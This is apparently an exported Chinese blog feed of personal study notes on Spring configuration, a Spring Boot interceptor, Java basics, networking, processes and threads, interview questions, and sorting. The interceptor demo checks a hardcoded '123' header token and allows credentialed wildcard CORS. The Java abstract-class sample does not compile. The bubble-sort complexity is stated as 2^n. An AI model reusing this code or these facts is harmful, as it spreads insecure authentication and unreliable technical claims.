<span class="token comment" spellcheck="true">&lt;!--是否使用spring对宏定义的支持--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exposeRequestAttributes<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>requestContextAttribute<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rc<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>velocityConfigurer<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.velocity.VelocityConfigurer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>resourceLoaderPath<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/page/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>velocityProperties<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>props</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input.encoding<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>output.encoding<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>contentType<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>text/html;charset=UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>props</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- JSP视图解析器  --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewResolverJsp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.InternalResourceViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/page/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.jsp<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- FreeMarker视图解析器 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewResolver<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.freemarker.FreeMarkerViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.freemarker.FreeMarkerView<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>contentType<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cache<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewNames<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>*.ftl<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web拦截器</title>
      <link href="/2022/02/16/web-lan-jie-qi/"/>
      <url>/2022/02/16/web-lan-jie-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="springboot请求拦截器"><a href="#springboot请求拦截器" class="headerlink" title="springboot请求拦截器"></a>springboot请求拦截器</h2><pre><code>WebMvcConfigurer：拦截器的注册类HandlerInterceptorAdapter：拦截组件</code></pre><p>拦截组件HandlerInterceptorAdapter可以有多个，需要注册到WebMvcConfigurer里面，在WebMvcConfigurer里面拦截器是按顺序执行的。</p><p>一、实现HandlerInterceptor接口中的preHandle方法（返回false表示拦截，true放行，在请求前拦截）</p><pre><code>public class AuthInterceptor implements HandlerInterceptor {    /**     * 通过配置是否认证，对开发环境免除校验，方便开发     */    @Value(&quot;${is.auth}&quot;)    private boolean isAuth;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {    //添加条件判断        if(handler instanceof HandlerMethod){            //可以从handler 获取中获得方法           // Method method = ((HandlerMethod) handler).getMethod();            if(isAuth){                ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();                HttpServletRequest request1 = requestAttributes.getRequest();                String sign = request1.getHeader(&quot;sign&quot;);                System.out.println(&quot;从HttpServletRequest直接获取&quot;+sign);                String sign1 = request1.getHeader(&quot;sign&quot;);                System.out.println(&quot;从RequestContextHolder中获取的&quot;+sign1);                if (&quot;123&quot;.equals(sign1)) {                    System.out.println(&quot;校验通过&quot;);                    return true;                }                System.out.println(&quot;校验不通过&quot;);                return false;            }        }        return true;    }    @Override    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {    }    @Override    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {    }}</code></pre><h2 id="WebMvcConfigurer拦截器注册类"><a href="#WebMvcConfigurer拦截器注册类" class="headerlink" title="WebMvcConfigurer拦截器注册类"></a>WebMvcConfigurer拦截器注册类</h2><p>1、配置拦截器（这个里面添加了跨域支持，当集成<a href="https://so.csdn.net/so/search?q=swagger&spm=1001.2101.3001.7020" target="_blank" rel="noopener">swagger</a>防止后台报错），如果没有必要删除其配置，这里做一下展示。</p><pre><code>@Configuration//加载当前的拦截器进行注册public class AdminCommonConfig implements WebMvcConfigurer {    /**     * 跨域支持     * @param registry     */    @Override    public void addCorsMappings(CorsRegistry registry) {        registry.addMapping(&quot;/**&quot;)                .allowedOrigins(&quot;*&quot;)                .allowCredentials(true)                .allowedMethods(&quot;GET&quot;, &quot;POST&quot;, &quot;DELETE&quot;, &quot;PUT&quot;)                .maxAge(3600 * 24);    }    /**     * 自定义拦截器地址     * @return     */    @Bean    public HandlerInterceptor authInterceptor(){        return new AuthInterceptor();    }    /**     * 添加拦截路径     * @param registry     */    @Override    public void addInterceptors(InterceptorRegistry registry) {        //拦截的url地址        String url = &quot;/**&quot;;        //添加排除排除URL校验路径        List&lt;String&gt; patterns = new ArrayList&lt;&gt;();        patterns.add(&quot;/css/**&quot;)        patterns.add(&quot;/web/login.html&quot;)        registry.addInterceptor(authInterceptor()).addPathPatterns(url).excludePathPatterns(patterns);    }    /**     * 当集成swagger防止后台报错     * No mapping found for HTTP request with URI [/swagger-resources/configuration/ui] in DispatcherServlet with name &#39;dispatcherServlet&#39;     * @param registry     */    @Override    public void addResourceHandlers(ResourceHandlerRegistry registry) {        //过滤swagger        registry.addResourceHandler(&quot;swagger-ui.html&quot;)                .addResourceLocations(&quot;classpath:/META-INF/resources/&quot;);        registry.addResourceHandler(&quot;/webjars/**&quot;)                .addResourceLocations(&quot;classpath:/META-INF/resources/webjars/&quot;);    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>进制基础知识</title>
      <link href="/2022/01/22/jin-zhi-ji-chu-zhi-shi/"/>
      <url>/2022/01/22/jin-zhi-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h4 id="1-十六进制，6-3为什么等12，怎么算"><a href="#1-十六进制，6-3为什么等12，怎么算" class="headerlink" title="1.十六进制，6*3为什么等12，怎么算"></a>1.十六进制，6*3为什么等12，怎么算</h4><p>通常我们用的是十进制:每到10就进一位,所以6<em>3=10+8<br>而时十六进制:每到十六就进一位,所以6</em>3=10(16=10)+2<br>也就是说在十六进制中16就相当于我们通常使用的十进制中的10（<strong>10进制是见10进1，16进制是见16进1</strong>）</p><p><strong>6进制</strong>：0,1,2,3,4,5（不能有超过，也就是说6进制的数在某一位上不能含有超过“6”的数，同理其他进制一样）</p><p>10进制和12进制得到相同数值，<strong>10进制的要比12进制的数值大</strong>，因为十进制每逢“10”进一，十二进制每逢“12”进一；</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题</title>
      <link href="/2022/01/19/mian-shi-ti/"/>
      <url>/2022/01/19/mian-shi-ti/</url>
      
        <content type="html"><![CDATA[<p><strong>1.以下属于Redis支持的数据类型是（ ）</strong></p><ul><li><pre><code>Strings</code></pre></li><li><pre><code>Lists</code></pre></li><li><pre><code>Sets</code></pre></li><li><blockquote><pre><code>集合排序</code></pre></blockquote></li></ul><p>解析：</p><p>redis一共包含5种数据类型 </p><p>  ①字符串 String （最基本的类型，可包含任意数据） </p><p>  ②哈希 Hash （String类型的field、value映射表） </p><p>  ③列表 List （字符串列表,有序不唯一） </p><p>  ④集合 set （字符串集合，无序唯一） </p><p>  ⑤集合排序 (有序集合sorted sets)（字符串集合，可以通过设置分数score进行排序） </p><p><strong>2.当你在浏览器地址栏输入一个URL后回车，将会发生的事情？</strong></p><pre><code>    1.浏览器向DNS服务器查找输入URL对应的IP地址。    2.DNS服务器返回网站的IP地址。    3.浏览器根据IP地址与目标web服务器在80端口上建立TCP连接    4.浏览器获取请求页面的html代码。    5.浏览器在显示窗口内渲染HTML。    6.窗口关闭时，浏览器终止与服务器的连接。这其中最有趣的是第1步和第2步(域名解析)。我们输入的网址(域名)是IP地址的一个别名， 在一个DNS内，一个域名对应一个IP地址。域名系统(DNS) 的工作就是将域名与它的IP地址对应起来。DNS是分布式的，同时也是具有层级关系的。一个域名服务器虽然只记录一个小的子网内的主机名和IP地址， 但所有的域名服务器联合起来工作，就能将全网内的域名与它们的IP地址对应起来。 这也就意味着，如果一个域名服务器无法找到某个请求域名所对应的IP地址， 它就会向其它的域名服务器发出请求进行寻找。</code></pre><p><img src="assets/image-20220119113922644.png" alt="image-20220119113922644"></p><p><strong>3.如何提高服务器响应速度</strong></p><pre><code>一、服务器周围环境　　服务器通常放置于机房，所说的周围环境也正是指机房。服务器基本是一天24小时不间断运行，所需要的电量如果没有得到足够保证，那么宕机的可能性就会增加。　　其次，一台不停运转的机器，会产生大量的热量，如果机房不能给予足够的散热与湿度保持，机器便会故障，对运行速度也会有很大影响。　　最后，在服务器配置相同的情况下，机房的带宽越大，访问速度相对越快。　二、本身配置　　服务器对非专业人员一直是难以理解的机器，但如果将其转化为我们熟知的东西就很好理解了。我们可以将服务器看做一台普通计算机，计算机中的处理器、内存和宽带都直接影响了其运行速度。　　因此，想要提升服务器速度，可以对这些硬件进行升级，做好维护，如果速度下降，也可以从这些方面进行排查。三、网站程序　　程序代码对速度影响也很大。代码越精简，所占用空间便会越小，访问速度便会越快。通常来说，编码人员都会有一个书写标准，但因为个人习惯问题而凭空多出许多冗余代码，导致速度被拖慢。壹基比观观 　　1. 对传输数据进行压缩处理，降低了网络传输的数据量。　　2. （减少HTTP请求数我们可以通过减少外部各类文件的数量调用次数来达到其目的）减少http：js、css、图片和flash等文件每一类下载都相当于一次HTTP请求，使用外部的JS和CSS，将内联的JS和CSS做成外部的JS、CSS。减少重复下载内联的JS和CSS。也可一可以直接把css和js写入到html页面中，避免了外部的调用;   　　3.使用浏览器缓存，在用户浏览网站的不同页面时，很多[[在本地缓存这些文件，将大大降低页面产生的流量，从而降低页面载入时间。　　4.减少与数据库的交互。　　5.控制程序的优化。　　6.采用多台服务器提高并行加载量四、优化服务器并发处理能力，提高吞吐量，提高CPU并发计算能力（多进程&amp;多线程）</code></pre><p><strong>4.java基本数据类型</strong></p><p>1、整型：byte 、int 、long 、short </p><p>2、浮点型：float 、 double</p><p>3、字符型：char</p><p>4、布尔型：boolean</p><p><strong>5.下面有关SPRING的事务传播特性，说法错误的是？</strong></p><p> A)PROPAGATION_SUPPORTS：支持当前事务，如果当前没有事务，就以非事务方式执行<br> B)PROPAGATION_REQUIRED：支持当前事务，如果当前没有事务，就抛出异常<br> C)PROPAGATION_REQUIRES_NEW：新建事务，如果当前存在事务，把当前事务挂起<br> D)PROPAGATION_NESTED：支持当前事务，新增Savepoint点，与当前事务同步提交或回滚</p><pre><code>    答案：B    解析：Spring的API设计很不错，基本上根据英文翻译就能知道作用:Required:必须的。说明必须要有事物，没有就新建事物。supports:支持。说明仅仅是支持事务，没有事务就非事务方式执行。mandatory:强制的。说明一定要有事务，没有事务就抛出异常。required_new:必须新建事物。如果当前存在事物就挂起。not_supported:不支持事物，如果存在事物就挂起。never:绝不有事务。如果存在事物就抛出异常</code></pre><p><strong>6.switch 是否能作用在 byte 、<em>long<em>、</em>String</em> ?</strong></p><ul><li>switch可作用于byte int short char<br>switch可作用于byte int short char 对应的包装类</li><li>switch中可以是枚举类型(<strong>JDK1.5</strong>之后)</li><li>switch中可以是字符串类型,String(<strong>JDK1.7</strong>之后才可以作用在string上)</li></ul><p><strong>7.抽象类(abstract class)和接口(interface)有什么异同？</strong></p><p><strong>同：</strong>1.抽象类和接口都不能实例化，但可以定义抽象类和接口的引用。</p><p>​        2.一个类如果实现了某个抽象类或者接口都需要对其中的抽象方法全部实现，否则该类仍然需要声明抽象类。</p><p><strong>异：</strong>1.接口比抽象类更加抽象，抽象类可以定义构造器，可以有抽象方法和具体方法。而接口全部都是抽象方法。</p><p>​        2.抽象类的成员可以是private，protected，public，而接口中的成员变量全部是public。</p><p>​        3.抽象类中可以定义成员变量，而接口定义的成员变量实际上都是常量。</p><p>​        4.有抽象方法的类必须声明抽象类，抽象类未必有抽象方法。</p><pre><code>在抽象类中定义构造方法abstract class Person{    private String name;    public Person(){    System.out.println(&quot;hello,jack&quot;);}public String getName(){    return name;}public void setName(String name){    this.name = name;}public abstract void getPersoninfo();}class Student extends Person(){    public Student(){        System.out.println(&quot;helllo,tom&quot;);    }    public void getPersoninfo(){        }    }     public class Test8(){    public static void main(String[] args){        Person per = new Person();      per.Person();      Student stu = new Student();       stu.Student();    }}</code></pre><p><strong>8.静态嵌套类（static nested class）和内部类（inner class）的不同？</strong></p><p>静态嵌套类是被声明为静态的内部类，他可以不依赖外部类实例被实例化。而通常的内部类需要在外部实例化后才能实例化。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2022/01/19/ji-suan-ji-wang-luo/"/>
      <url>/2022/01/19/ji-suan-ji-wang-luo/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网络层次划分"><a href="#一、网络层次划分" class="headerlink" title="一、网络层次划分"></a>一、网络层次划分</h2><p>第一种模型是OSI七层模型，OSI为（Open System interconnect）的缩写，自上而下分别是<strong>应用层、表示层、会话层、传输层、<a href="https://so.csdn.net/so/search?q=网络层&spm=1001.2101.3001.7020" target="_blank" rel="noopener">网络层</a>、数据链路层、物理层</strong></p><p>物理层：网卡，网线，集线器，中继器，调制解调器</p><p>数据链路层：网桥，交换机</p><p>网络层：路由器</p><p><img src="assets/image-20220119103511754.png" alt="image-20220119103511754"></p><p><strong>数据链路层协议：PPP ARP MAC IEEE802.3</strong><br> <strong>网络层协议：IP BGMP</strong><br> <strong>传输层协议：TCP UDP</strong><br> <strong>应用层协议：HTTP HTTPS FTP Telnet SMTP</strong></p><p>五层协议的体系结构知识为了介绍网络原理而设计的,实际应用还是采用TCP/IP四层体系结构。</p><p><img src="assets/image-20220119104203951.png" alt="image-20220119104203951"></p><h2 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h2><p>链接：<a href="https://www.nowcoder.com/questionTerminal/a348b0c0d06844a888b2e946e80e946b" target="_blank" rel="noopener">https://www.nowcoder.com/questionTerminal/a348b0c0d06844a888b2e946e80e946b</a><br>来源：牛客网</p><p><strong><em>1.Linux下哪个命令可以用于判断host1主机是否能够访问host2主机的端口？</em></strong></p><p>ping是使用的ICMP协议，是IP层协议，但是端口是应用层的，所以它只能判断能够访问ip，不能判断端口 </p><p>ifconfig是查看本机的网络设置，IP，子网掩码等 </p><p><strong>telnet是应用层的，可以判端口访问情况</strong> </p><p> netstat显示网络信息，如网络连接，路由表，接口状态</p><p><img src="assets/image-20220119105943270.png" alt="image-20220119105943270"></p><p><strong>2.以下选项属于进程间通信的是（ABD）</strong></p><p><strong>A.管道</strong><br> <strong>B.套接字</strong><br> C.内存<br> <strong>D.消息队列</strong></p><p>解析：进程中的几种通信方式：<br>1）<strong>管道</strong>：管道是一种半双工的通信方式，数据只能单向流动。而且只能在具有血缘关系（父子进程之间）的进程间使用。<br>2）<strong>信号量</strong>：信号量是一个计数器，可以用来控制多个进程对共享资源的访问<br>3）<strong>消息队列</strong>：消息队列是由消息组成的链表，存放在内核中，并由消息队列标识符标识<br>4）<strong>信号</strong>：信号是有一种比较复杂的通信方式，用于通知接收进程某一事件已经发生<br>5）<strong>共享内存</strong>：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问<br>6）<strong>套接字</strong>：即Socket，是一种通信机制，凭借这种机制，客户/服务器系统的开发工作既可以在本地单机上进行，也可以跨网络进行</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础知识</title>
      <link href="/2022/01/18/java-ji-chu-zhi-shi/"/>
      <url>/2022/01/18/java-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、重写和重载"><a href="#一、重写和重载" class="headerlink" title="一、重写和重载"></a>一、重写和重载</h2><h4 id="1-重写-运行时的多态性"><a href="#1-重写-运行时的多态性" class="headerlink" title="1.重写(运行时的多态性)"></a>1.<strong>重写</strong>(运行时的多态性)</h4><p>1.发生在父类与子类之间<br>2.方法名，参数列表，返回类型（除过子类中方法的返回类型是父类中返回类型的子类）必须相同<br>3.访问修饰符的限制一定要大于被重写方法的访问修饰符（public&gt;protected&gt;default&gt;private)<br>4.重写方法一定不能抛出新的检查异常或者比被重写方法申明更加宽泛的检查型异常</p><h4 id="2-重载-编译时的多态性"><a href="#2-重载-编译时的多态性" class="headerlink" title="2.重载(编译时的多态性)"></a>2.重载(编译时的多态性)</h4><p>在一个类中，同名的方法如果有不同的参数列表（<strong>参数类型不同、参数个数不同甚至是参数顺序不同</strong>）<strong>（同名不同参）</strong>则视为重载。同时，重载对返回类型没有要求，可以相同也可以不同，但<strong>不能通过返回类型是否相同来判断重载</strong>。 </p><p><strong>方法重载只能发生在一个类的内部</strong></p><p><strong>构造方法能重载，静态方法也能重载</strong></p><h4 id="3-重载（Overload）和重写（Override）的区别？"><a href="#3-重载（Overload）和重写（Override）的区别？" class="headerlink" title="3.重载（Overload）和重写（Override）的区别？"></a>3.重载（Overload）和重写（Override）的区别？</h4><p>答：<strong>方法的重载和重写都是实现多态的方式</strong>，区别在于前者实现的是<strong>编译时</strong>的多态性，而后者实现的是<strong>运行时</strong>的多态性。</p><p>重载发生在一个类中，同名的方法如果有不同的参数列表（参数类型不同、参数个数不同或者二者都不同）则视为重载；</p><p>重写发生在子类与父类之间，重写要求子类被重写方法与父类被重写方法有相同的参数列表，有兼容的返回类型，比父类被重写方法更好访问，不能比父类被重写方法声明更多的异常（里氏代换原则）。重载对返回类型没有特殊的要求，不能根据返回类型进行区分。</p><h4 id="4-构造方法没有返回值。"><a href="#4-构造方法没有返回值。" class="headerlink" title="4.构造方法没有返回值。"></a><strong>4.构造方法没有返回值。</strong></h4><h4 id="5-成员方法又称为实例方法，静态方法又称为类方法"><a href="#5-成员方法又称为实例方法，静态方法又称为类方法" class="headerlink" title="5.成员方法又称为实例方法，静态方法又称为类方法"></a>5.成员方法又称为实例方法，静态方法又称为类方法</h4><h4 id="6-方法与函数"><a href="#6-方法与函数" class="headerlink" title="6.方法与函数"></a>6.方法与函数</h4><p>这两个概念不严格区分，就是一个东西，通过对象调用的，就是方法，直接调用，就是函数；</p><h4 id="7-for循环，break之后不执行i-，而continue之后会执行i"><a href="#7-for循环，break之后不执行i-，而continue之后会执行i" class="headerlink" title="7.for循环，break之后不执行i++，而continue之后会执行i++"></a>7.for循环，break之后不执行i++，而continue之后会执行i++</h4><h4 id="8-int和Integer的区别"><a href="#8-int和Integer的区别" class="headerlink" title="8.int和Integer的区别"></a>8.<a href="https://www.cnblogs.com/guodongdidi/p/6953217.html" target="_blank" rel="noopener">int和Integer的区别</a></h4><p>1、Integer是int的包装类，int则是java的一种基本数据类型<br>2、Integer变量必须实例化后才能使用，而int变量不需要<br>3、Integer实际是对象的引用，当new一个Integer时，实际上是生成一个指针指向此对象；而int则是直接存储数据值<br>4、Integer的默认值是null，int的默认值是0</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>线程与进程</title>
      <link href="/2022/01/18/xian-cheng-yu-jin-cheng/"/>
      <url>/2022/01/18/xian-cheng-yu-jin-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><p>1、<strong>进程是系统进行资源分配和调度的基本单位，线程是CPU调度和分配的基本单位</strong></p><p>2、<strong>一个线程可以创建和撤消另一个线程</strong>，同一进程中的多个线程之间可以并发执行。</p><p>3、进程在执行过程中拥有独立的内存单元，而该进程的多个线程共享内存，从而极大地提高了程序的运行效率。 </p><p>4、<strong><em>同属</em>一个进程的<em>其他的线程</em>共享进程所拥有的全部资源.</strong> </p><p>5、<strong>多线程和多进程都会引发死锁</strong></p><h2 id="二、线程与进程"><a href="#二、线程与进程" class="headerlink" title="二、线程与进程"></a>二、线程与进程</h2><p>1、线程和进程一样分为五个阶段：<strong>创建、就绪、运行、阻塞、终止</strong>。</p><p>2、多进程是指操作系统能同时运行多个任务（程序）。<br>      多线程是指在同一程序中有多个顺序流在执行。</p><p>3、</p><h2 id="三、进程与线程的区别"><a href="#三、进程与线程的区别" class="headerlink" title="三、进程与线程的区别"></a>三、进程与线程的区别</h2><p>（1）调度：线程作为<strong>调度和分配</strong>的基本单位，进程作为<strong>拥有资源</strong>的基本单位</p><p>（2）并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可并发执行</p><p>（3）拥有资源：进程是拥有资源的一个独立单位，<strong>线程不拥有系统资源</strong>，但可以访问隶属于进程的资源.</p><p>（4）系统开销：在<strong>创建或撤消进程</strong>时，由于系统都要为之分配和回收资源，导致系统的开销明显大于创建或撤消线程时的开销</p><h2 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h2><p>1、java中实现Runnable类的线程体应该写在run()方法体中。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2022/01/14/pai-xu-suan-fa/"/>
      <url>/2022/01/14/pai-xu-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="一、冒泡排序"><a href="#一、冒泡排序" class="headerlink" title="一、冒泡排序"></a>一、冒泡排序</h2><p>其实现原理是重复扫描待排序序列，并比较每一对相邻的元素，当该对元素顺序不正确时进行交换。一直重复这个过程，直到没有任何两个相邻元素可以交换，就表明完成了排序。复杂度为 2^n</p><pre><code>for(i = nums.length-1; i&gt;0; i--){    for(j = 0; j&lt;i; j++){        if(nums[j] &gt; nums[j+1]){            int temp = nums[j];            nums[j] = nums[j+1];            nums[j+1] = temp;        }            }}</code></pre><h2 id="二、快速排序"><a href="#二、快速排序" class="headerlink" title="二、快速排序"></a>二、快速排序</h2><p>快速排序是冒泡排序的一种优化。</p><pre><code>/* * 快速排序 * * 参数说明： *     a -- 待排序的数组 *     l -- 数组的左边界(例如，从    +-起始位置开始排序，则l=0) *     r -- 数组的右边界(例如，排序截至到数组末尾，则r=a.length-1) */void quick_sort(int a[], int l, int r){    if (l &lt; r)    {        int i,j,x;        i = l;        j = r;        x = a[i];        while (i &lt; j)        {            while(i &lt; j &amp;&amp; a[j] &gt; x)                j--; // 从右向左找第一个小于x的数            if(i &lt; j)                a[i++] = a[j];            while(i &lt; j &amp;&amp; a[i] &lt; x)                i++; // 从左向右找第一个大于x的数            if(i &lt; j)                a[j--] = a[i];        }        a[i] = x;        quick_sort(a, l, i-1); /* 依据a[i]分为左边并对左边进行递归调用 */        quick_sort(a, i+1, r); /* 依据a[i]分为右边并对右边进行递归调用 */    }}</code></pre><h2 id="三、选择排序"><a href="#三、选择排序" class="headerlink" title="三、选择排序"></a>三、选择排序</h2><p>选择排序(Selection  sort)是一种简单直观的排序算法。其基本思想是：首先在未排序的数列中找到最小(or最大)元素，然后将其存放到数列的起始位置；接着，再从剩余未排序的元素中继续寻找最小(or最大)元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 </p><p>选择排序的时间复杂度是 n^2 